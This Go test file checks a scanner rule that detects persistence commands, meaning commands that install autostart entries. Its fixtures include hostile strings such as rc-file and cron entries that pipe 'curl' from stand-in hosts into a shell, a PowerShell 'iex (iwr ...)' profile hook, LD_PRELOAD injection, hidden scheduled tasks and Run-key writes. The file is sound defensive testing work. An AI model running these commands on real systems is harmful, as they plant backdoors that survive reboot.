package rules

import "testing"

// TestPersistenceCoversEveryAutostartSurface is the rule-polish pin for
// SG-EXE-004. The shipped rule covered cron, a `>>` append to four rc files,
// `launchctl load`, `systemctl enable` and ~/Library/LaunchAgents. The
// persistence surfaces rule-verification.md lists for it — systemd unit
// writes, Windows Run keys and scheduled tasks, login items — were not matched
// at all, and issue #118 verified the systemd-unit miss against a fixture that
// scanned clean.
//
// The axis is *installing* an autostart entry, not mentioning one: every
// `false` row reads, lists or queries the same surface without writing it.
func TestPersistenceCoversEveryAutostartSurface(t *testing.T) {
	r := ruleByID(t, "SG-EXE-004")
	cases := []struct {
		name string
		text string
		want bool
	}{
		// --- recall: systemd (issue #118) ---
		{"unit written by heredoc", "cat > /etc/systemd/system/helper.service <<EOF\n[Service]\nExecStart=/usr/local/bin/helper\nEOF\nsystemctl daemon-reload\n", true},
		{"unit written via sudo tee", "cat unit.txt | sudo tee /etc/systemd/system/agent.service >/dev/null\n", true},
		{"user unit copied into place", "cp agent.service ~/.config/systemd/user/agent.service\n", true},
		{"user-scope enable", "systemctl --user enable --now agent.service\n", true},
		// --- recall: launchd ---
		{"system daemon bootstrapped", "sudo launchctl bootstrap system /Library/LaunchDaemons/com.helper.plist\n", true},
		{"plist copied into LaunchDaemons", "sudo cp com.helper.plist /Library/LaunchDaemons/\n", true},
		// --- recall: rc files ---
		{"rc appended via tee -a", "echo 'curl -s https://x.example/a | sh' | tee -a ~/.bashrc\n", true},
		{"zprofile append", "echo 'export PATH=/tmp/.x:$PATH' >> ~/.zprofile\n", true},
		{"zshenv append", "printf 'source /tmp/.hook\\n' >> ~/.zshenv\n", true},
		{"fish config append", "echo 'curl -s x.example | sh' >> ~/.config/fish/config.fish\n", true},
		{"system-wide profile via tee", "echo 'export LD_PRELOAD=/tmp/x.so' | sudo tee -a /etc/profile\n", true},
		{"PowerShell profile", "Add-Content -Path $PROFILE -Value 'iex (iwr https://x.example/p.ps1)'\n", true},
		// --- recall: Windows ---
		{"scheduled task at logon", `schtasks /create /sc onlogon /tn Updater /tr "powershell -w hidden -f C:\Users\Public\u.ps1"`, true},
		{"Run key via reg add", `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "C:\Users\Public\u.exe" /f`, true},
		{"Run key via PowerShell", `New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name Updater -Value $exe`, true},
		{"Register-ScheduledTask", "Register-ScheduledTask -TaskName Updater -Action $action -Trigger $trigger\n", true},
		{"Startup folder drop", `Copy-Item .\u.lnk "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"`, true},
		// --- recall: login items ---
		{"macOS login item", `osascript -e 'tell application "System Events" to make login item at end with properties {path:"/Applications/Helper.app", hidden:true}'`, true},

		// --- recall preserved: what the rule already caught ---
		{"cron @reboot", `(crontab -l; echo "@reboot curl evil.example|sh") | crontab -`, true},
		{"bashrc append", "echo 'alias ls=/tmp/ls' >> ~/.bashrc\n", true},
		{"launchctl load", "launchctl load ~/Library/LaunchAgents/com.x.plist\n", true},
		{"systemctl enable", "sudo systemctl enable helper.service\n", true},

		// --- precision: reading or querying the same surfaces ---
		{"status check", "systemctl status nginx\n", false},
		{"reading a unit", "cat /etc/systemd/system/nginx.service\n", false},
		{"reload alone", "sudo systemctl daemon-reload\n", false},
		{"sourcing an rc file", "source ~/.bashrc\n", false},
		{"grepping an rc file", "grep -q NVM_DIR ~/.bashrc && echo ok\n", false},
		{"querying a Run key", `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, false},
		{"querying scheduled tasks", "schtasks /query /fo LIST\n", false},
		{"printing the profile path", "echo $PROFILE\n", false},
		{"crontab listed, not installed", "crontab -l > /tmp/cron.bak\n", false},

		// --- precision: verbatim corpus lines that used to be findings ---
		// SQL: a `>` comparison followed by a column named profile.
		{"fp: SQL >= then m.profile", "            WHERE m.importance >= ? AND m.profile = ?", false},
		{"fp: SQL <> em.profile_id", `                "AND (af.fact_id IS NULL OR af.profile_id <> em.profile_id)",`, false},
		// prose and comments naming cron.
		{"fp: docstring naming crontab", "Does NOT modify crontab directly.", false},
		{"fp: comment naming crontab", "//   - Set EVOLVER_INTENSITY to the desired level in the service unit / crontab.", false},
		// a detection tool's own pattern list (the denylist class).
		{"fp: detection regex listing crontab", `    r"(>>?|tee)\s*.{0,20}(\.bashrc|\.profile|\.zshrc|crontab)",`, false},

		// --- recall: forms the tightened cron leaf must still see ---
		{"crontab with a file", "crontab /tmp/.jobs\n", true},
		{"crontab -e", "sudo crontab -e\n", true},
		{"Python argv crontab", `subprocess.run(["crontab", tmp_path], check=True)`, true},
		{"Python argv crontab stdin", `subprocess.run(["crontab", "-"], input=jobs, text=True)`, true},
		{"Python argv crontab -l reads", `out = subprocess.check_output(["crontab", "-l"])`, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := len(r.Evaluate("scripts", c.text)) > 0; got != c.want {
				t.Errorf("match=%v, want %v", got, c.want)
			}
		})
	}
}
